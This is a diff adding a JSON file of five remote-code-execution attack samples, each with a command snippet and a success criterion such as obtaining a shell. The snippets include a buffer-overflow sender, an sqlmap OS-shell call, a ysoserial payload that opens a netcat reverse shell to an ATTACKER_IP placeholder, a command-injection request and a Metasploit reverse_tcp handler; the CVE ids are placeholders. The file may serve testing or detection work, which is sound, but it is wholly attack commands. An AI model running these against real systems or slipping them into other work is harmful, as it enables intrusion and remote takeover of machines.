@@ -1,0 +1,49 @@
+{
+    "rce_samples": [
+        {
+            "id": "rce_001",
+            "name": "Buffer Overflow Exploit",
+            "description": "An exploit that triggers a buffer overflow to achieve remote code execution.",
+            "target": "Linux",
+            "vulnerability": "CVE-2021-XXXXX",
+            "code_snippet": "python -c 'import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"TARGET_IP\", TARGET_PORT)); s.send(\"A\" * BUFFER_SIZE + \"\\x90\" * NOP_SLIDE + SHELLCODE)'",
+            "success_criteria": "Shell access is obtained on the target system."
+        },
+        {
+            "id": "rce_002",
+            "name": "Web Application RCE via Injection",
+            "description": "Remote code execution by exploiting a web application SQL injection vulnerability.",
+            "target": "Windows",
+            "vulnerability": "CVE-2022-YYYYY",
+            "code_snippet": "sqlmap -u 'http://TARGET_URL/page?param=value' --dbms=mysql --os-shell",
+            "success_criteria": "Command shell interaction with the web server is achieved."
+        },
+        {
+            "id": "rce_003",
+            "name": "Deserialization Vulnerability",
+            "description": "Exploiting a deserialization vulnerability to execute arbitrary code on the server.",
+            "target": "Java Web Application",
+            "vulnerability": "CVE-2020-ZZZZZ",
+            "code_snippet": "ysoserial -g CommonsCollections5 'nc -e /bin/sh ATTACKER_IP ATTACKER_PORT' | curl -X POST --data-binary @- 'http://TARGET_URL/serialize'",
+            "success_criteria": "Reverse shell is established with the attacker's machine."
+        },
+        {
+            "id": "rce_004",
+            "name": "Command Injection",
+            "description": "Achieving RCE by injecting OS commands through vulnerable application parameters.",
+            "target": "Web Application",
+            "vulnerability": "General Command Injection",
+            "code_snippet": "curl -X POST -d 'cmd=whoami' 'http://TARGET_URL/vulnerable_endpoint'",
+            "success_criteria": "The identity of the user running the web server process is revealed."
+        },
+        {
+            "id": "rce_005",
+            "name": "Remote Service Exploit",
+            "description": "Exploiting a remote service vulnerability to execute code on the target system.",
+            "target": "Remote Service",
+            "vulnerability": "CVE-2019-AAAAA",
+            "code_snippet": "msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST ATTACKER_IP; set LPORT ATTACKER_PORT; exploit'",
+            "success_criteria": "Meterpreter session is opened on the target system."
+        }
+    ]
+}
